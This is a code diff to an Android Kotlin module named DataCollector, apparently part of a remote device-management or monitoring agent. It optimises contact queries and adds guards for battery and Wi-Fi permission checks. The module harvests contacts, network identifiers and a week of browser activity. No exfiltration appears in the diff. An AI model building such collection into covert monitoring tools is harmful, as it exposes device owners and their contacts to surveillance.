@@ -2,6 +2,7 @@ package com.abuzahra.manager.executor
 
 import android.Manifest
 import android.content.Context
+import android.content.pm.PackageManager
 import android.database.Cursor
 import android.net.Uri
 import android.os.Build
@@ -108,6 +109,39 @@ object DataCollector {
     fun getContacts(context: Context): List<Map<String, Any>> {
         val list = mutableListOf<Map<String, Any>>()
         try {
+            // Batch query all phone numbers upfront to avoid N+1 queries
+            val phoneMap = mutableMapOf<String, MutableList<String>>()
+            context.contentResolver.query(
+                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Phone.CONTACT_ID, ContactsContract.CommonDataKinds.Phone.NUMBER),
+                null, null, null
+            )?.use { pc ->
+                val idCol = pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.CONTACT_ID)
+                val numCol = pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (pc.moveToNext()) {
+                    val contactId = pc.getString(idCol)
+                    val number = pc.getString(numCol)
+                    phoneMap.getOrPut(contactId) { mutableListOf() }.add(number)
+                }
+            }
+
+            // Batch query all emails upfront
+            val emailMap = mutableMapOf<String, MutableList<String>>()
+            context.contentResolver.query(
+                ContactsContract.CommonDataKinds.Email.CONTENT_URI,
+                arrayOf(ContactsContract.CommonDataKinds.Email.CONTACT_ID, ContactsContract.CommonDataKinds.Email.DATA),
+                null, null, null
+            )?.use { ec ->
+                val idCol = ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.CONTACT_ID)
+                val dataCol = ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)
+                while (ec.moveToNext()) {
+                    val contactId = ec.getString(idCol)
+                    val email = ec.getString(dataCol)
+                    emailMap.getOrPut(contactId) { mutableListOf() }.add(email)
+                }
+            }
+
+            // Now iterate contacts and join from maps
             val cursor = context.contentResolver.query(
                 ContactsContract.Contacts.CONTENT_URI, null, null, null,
                 "${ContactsContract.Contacts.DISPLAY_NAME} ASC"
@@ -117,40 +151,12 @@ object DataCollector {
                 while (it.moveToNext() && count < 500) {
                     val id = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts._ID))
                     val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME))
-                    val phones = mutableListOf<String>()
-                    val emails = mutableListOf<String>()
-
-                    // Get phone numbers
-                    val phoneCursor = context.contentResolver.query(
-                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                        null,
-                        "${ContactsContract.CommonDataKinds.Phone.CONTACT_ID} = ?",
-                        arrayOf(id), null
-                    )
-                    phoneCursor?.use { pc ->
-                        while (pc.moveToNext()) {
-                            phones.add(pc.getString(pc.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER)))
-                        }
-                    }
-
-                    // Get emails
-                    val emailCursor = context.contentResolver.query(
-                        ContactsContract.CommonDataKinds.Email.CONTENT_URI,
-                        null,
-                        "${ContactsContract.CommonDataKinds.Email.CONTACT_ID} = ?",
-                        arrayOf(id), null
-                    )
-                    emailCursor?.use { ec ->
-                        while (ec.moveToNext()) {
-                            emails.add(ec.getString(ec.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Email.DATA)))
-                        }
-                    }
 
                     list.add(mapOf(
                         "id" to id,
                         "name" to name,
-                        "phones" to phones,
-                        "emails" to emails
+                        "phones" to (phoneMap[id] ?: emptyList()),
+                        "emails" to (emailMap[id] ?: emptyList())
                     ))
                     count++
                 }
@@ -244,7 +250,7 @@ object DataCollector {
             val battery = context.registerReceiver(null, filter) ?: return mapOf("level" to 0)
             val level = battery.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1)
             val scale = battery.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1)
-            val percent = (level * 100 / scale.toFloat()).toInt()
+            val percent = if (scale > 0) (level * 100 / scale.toFloat()).toInt() else 0
             val status = when (battery.getIntExtra(android.os.BatteryManager.EXTRA_STATUS, -1)) {
                 android.os.BatteryManager.BATTERY_STATUS_CHARGING -> "charging"
                 android.os.BatteryManager.BATTERY_STATUS_DISCHARGING -> "discharging"
@@ -312,8 +318,18 @@ object DataCollector {
             
             var ssid = ""
             var bssid = ""
-            try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
-            try { bssid = info.bssid ?: "" } catch (_: Exception) {}
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                if (context.checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+                    try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
+                    try { bssid = info.bssid ?: "" } catch (_: Exception) {}
+                } else {
+                    ssid = "<location permission required>"
+                    bssid = "<location permission required>"
+                }
+            } else {
+                try { ssid = info.ssid?.removeSurrounding("\"") ?: "" } catch (_: Exception) {}
+                try { bssid = info.bssid ?: "" } catch (_: Exception) {}
+            }
             
             mapOf(
                 "ssid" to ssid,
@@ -501,26 +517,33 @@ object DataCollector {
             val startTime = endTime - (7 * 24 * 60 * 60 * 1000L) // last 7 days
             val events = usageStatsManager.queryEvents(startTime, endTime)
             val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault())
-            val eventList = mutableListOf<android.app.usage.UsageEvents.Event>()
+            val eventList = mutableListOf<Map<String, Any>>()
             while (events.hasNextEvent()) {
                 val event = android.app.usage.UsageEvents.Event()
                 events.getNextEvent(event)
-                eventList.add(event)
+                // Copy fields into a new map instead of storing the reusable Event object
+                eventList.add(mapOf(
+                    "packageName" to event.packageName,
+                    "eventType" to event.eventType,
+                    "timeStamp" to event.timeStamp
+                ))
             }
             val recentBrowserEvents = eventList
-                .filter { it.packageName in browserPackages && it.eventType == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED }
-                .sortedByDescending { it.timeStamp }
+                .filter { it["packageName"] in browserPackages && it["eventType"] == android.app.usage.UsageEvents.Event.ACTIVITY_RESUMED }
+                .sortedByDescending { it["timeStamp"] as Long }
                 .take(50)
             val pm = context.packageManager
             for (event in recentBrowserEvents) {
+                val pkgName = event["packageName"] as String
+                val timestamp = event["timeStamp"] as Long
                 val appName = try {
-                    pm.getApplicationLabel(pm.getApplicationInfo(event.packageName, 0)).toString()
-                } catch (_: Exception) { event.packageName }
+                    pm.getApplicationLabel(pm.getApplicationInfo(pkgName, 0)).toString()
+                } catch (_: Exception) { pkgName }
                 list.add(mapOf(
-                    "package" to event.packageName,
+                    "package" to pkgName,
                     "app" to appName,
-                    "timestamp" to event.timeStamp,
-                    "datetime" to sdf.format(Date(event.timeStamp))
+                    "timestamp" to timestamp,
+                    "datetime" to sdf.format(Date(timestamp))
                 ))
             }
             if (list.isEmpty()) {
